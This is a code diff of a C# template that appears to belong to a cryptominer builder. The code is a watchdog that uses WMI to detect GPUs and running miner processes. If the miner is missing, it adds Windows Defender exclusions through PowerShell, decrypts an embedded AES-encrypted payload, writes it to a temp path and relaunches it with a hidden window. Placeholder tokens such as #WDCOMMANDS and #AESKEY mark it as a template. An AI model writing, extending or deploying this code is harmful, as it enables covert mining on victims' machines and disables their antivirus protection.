@@ -47,22 +47,22 @@ public partial class _rProgram_
             string _rarg1_ = "";
             var _rarg4_ = new ConnectionOptions();
             _rarg4_.Impersonation = ImpersonationLevel.Impersonate;
-            var _rarg5_ = new ManagementScope(_rGetString_("#WMISCOPE"), _rarg4_);
+            var _rarg5_ = new ManagementScope("#WMISCOPE", _rarg4_);
             _rarg5_.Connect();
 
-            var rarg6 = new ManagementObjectSearcher(_rarg5_, new ObjectQuery(_rGetString_("#GPUQUERY"))).Get();
+            var rarg6 = new ManagementObjectSearcher(_rarg5_, new ObjectQuery("#GPUQUERY")).Get();
             foreach (ManagementObject MemObj in rarg6)
             {
                 _rarg1_ += (" " + MemObj["VideoProcessor"] + " " + MemObj["Name"]);
             }
 
-            bool _rarg2_ = _rarg1_.IndexOf(_rGetString_("#STRNVIDIA"), StringComparison.OrdinalIgnoreCase) >= 0 || _rarg1_.IndexOf(_rGetString_("#STRAMD"), StringComparison.OrdinalIgnoreCase) >= 0;
+            bool _rarg2_ = _rarg1_.IndexOf("#STRNVIDIA", StringComparison.OrdinalIgnoreCase) >= 0 || _rarg1_.IndexOf("#STRAMD", StringComparison.OrdinalIgnoreCase) >= 0;
 
             string _rminers_ = "";
-            var _rarg7_ = new ManagementObjectSearcher(_rarg5_, new ObjectQuery(_rGetString_("#MINERQUERY"))).Get();
+            var _rarg7_ = new ManagementObjectSearcher(_rarg5_, new ObjectQuery("#MINERQUERY")).Get();
             foreach (ManagementObject retObject in _rarg7_)
             {
-                if (retObject != null && retObject["CommandLine"] != null && retObject["CommandLine"].ToString().Contains(_rGetString_("#MINERID")))
+                if (retObject != null && retObject["CommandLine"] != null && retObject["CommandLine"].ToString().Contains("#MINERID"))
                 {
                     _rminers_ += retObject["CommandLine"].ToString();
                 }
@@ -72,22 +72,23 @@ public partial class _rProgram_
             bool _rmissing_ = false;
             foreach (string[] _set_ in _rminerset_)
             {
-                if(!_rminers_.Contains(_rGetString_(_set_[0])) && (_set_[1] == _rGetString_("#XID") || (_set_[1] == _rGetString_("#EID") && _rarg2_)))
+                if(!_rminers_.Contains(_rGetString_(_set_[0])) && (_set_[1] == "#XID" || (_set_[1] == "#EID" && _rarg2_)))
                 {
                     _rmissing_ = true;
                     break;
                 }
             }
 
-            if (!File.Exists(_rplp_) || _rmissing_)
+            bool _rexists_ = File.Exists(_rplp_);
+            if (!_rexists_ || _rmissing_)
             {
-                if (!File.Exists(_rplp_) || _rcheckcount_ > 2)
+                if (!_rexists_ || _rcheckcount_ > 2)
                 {
                     _rcheckcount_ = 0;
 #if DefWDExclusions
                     try
                     {
-                        _rCommand_(_rGetString_("#SCMD"), _rGetString_("#DefenderCommands"));
+                        _rCommand_("#SPOWERSHELL", "#WDCOMMANDS");
                     }
                     catch (Exception ex)
                     {
@@ -96,12 +97,18 @@ public partial class _rProgram_
 #endif
                     }
 #endif
-                    File.WriteAllBytes(_rplp_, _rAESMethod_(_rxm_));
+                    string _rpath_ = _rplp_;
+                    if (!_rexists_)
+                    {
+                        _rpath_ = Path.Combine(Path.GetTempPath(), "#STRRNDPATH");
+                        Directory.CreateDirectory(Path.GetDirectoryName(_rpath_));
+                        File.WriteAllBytes(_rpath_, _rAESMethod_(_rxm_));
+                    }
                     Process.Start(new ProcessStartInfo
                     {
-                        FileName = _rplp_,
+                        FileName = _rpath_,
+                        WorkingDirectory = Path.GetDirectoryName(_rpath_),
                         WindowStyle = ProcessWindowStyle.Hidden,
-                        WorkingDirectory = Path.GetDirectoryName(_rplp_),
                         CreateNoWindow = true
                     });
                 }
@@ -124,23 +131,23 @@ public partial class _rProgram_
 
     public static string _rGetString_(string _rarg1_)
     {
-        return Encoding.ASCII.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
+        return Encoding.Unicode.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
     }
 
-    public static byte[] _rAESMethod_(byte[] _rarg1_, bool _rarg2_ = false)
+    public static byte[] _rAESMethod_(byte[] _rinput_, bool _rencrypt_ = false)
     {
-        var _rarg3_ = Encoding.ASCII.GetBytes("#IV");
-        var _rarg4_ = new Rfc2898DeriveBytes("#KEY", Encoding.ASCII.GetBytes("#SALT"), 100);
-        var _rarg5_ = new RijndaelManaged() { KeySize = 256, Mode = CipherMode.CBC };
-        var _rarg6_ = _rarg2_ ? _rarg5_.CreateEncryptor(_rarg4_.GetBytes(16), _rarg3_) : _rarg5_.CreateDecryptor(_rarg4_.GetBytes(16), _rarg3_);
-        using (var _rarg7_ = new MemoryStream())
+        var _rkeybytes_ = new Rfc2898DeriveBytes(@"#AESKEY", Encoding.ASCII.GetBytes(@"#SALT"), 100).GetBytes(16);
+        using (Aes _raesAlg_ = Aes.Create())
         {
-            using (var _rarg8_ = new CryptoStream(_rarg7_, _rarg6_, CryptoStreamMode.Write))
+            using (MemoryStream _rmsDecrypt_ = new MemoryStream())
             {
-                _rarg8_.Write(_rarg1_, 0, _rarg1_.Length);
-                _rarg8_.Close();
+                using (CryptoStream _rcsDecrypt_ = new CryptoStream(_rmsDecrypt_, _rencrypt_ ? _raesAlg_.CreateEncryptor(_rkeybytes_, Encoding.ASCII.GetBytes(@"#IV")) : _raesAlg_.CreateDecryptor(_rkeybytes_, Encoding.ASCII.GetBytes(@"#IV")), CryptoStreamMode.Write))
+                {
+                    _rcsDecrypt_.Write(_rinput_, 0, _rinput_.Length);
+                    _rcsDecrypt_.Close();
+                }
+                return _rmsDecrypt_.ToArray();
             }
-            return _rarg7_.ToArray();
         }
     }
 
